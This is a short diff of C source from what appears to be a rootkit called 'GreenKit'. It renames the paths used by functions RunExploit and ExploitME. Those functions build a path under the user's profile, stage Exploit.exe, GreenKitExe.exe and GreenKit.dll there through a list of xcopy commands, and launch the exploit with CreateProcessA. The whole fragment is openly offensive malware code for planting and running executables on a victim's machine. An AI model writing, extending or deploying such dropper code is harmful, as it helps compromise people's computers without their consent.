@@ -17,7 +17,7 @@ void RunExploit()
 	char profilepath[250];
 	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);
 
-	char* exploit_path = strcat(profilepath, "\\Documents\\Temp\\Exploit.exe");
+	char* exploit_path = strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_Exploit.exe");
 
 	si.cb = sizeof(si);
 	CreateProcessA(
@@ -67,11 +67,12 @@ int ExploitME()
 	char profilepath[250];
 	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);
 
-	char* exploit_path = strcat(profilepath, "\\Documents\\Temp\\Exploit.exe");
+	char* exploit_path = strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_Exploit.exe");
 
-	PCHAR copy[] = { "xcopy Exploit.exe %USERPROFILE%\\Documents\\Temp\\ /s",
-		"xcopy GreenKitExe.exe %USERPROFILE%\\Documents\\Temp\\ /s",
-		"xcopy GreenKit.dll %USERPROFILE%\\Documents\\Temp\\ /s",
+    PCHAR copy[] = {
+        "xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /s",
+		"xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /s",
+		"xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\ /s",
 		"exit",
 		NULL };
 
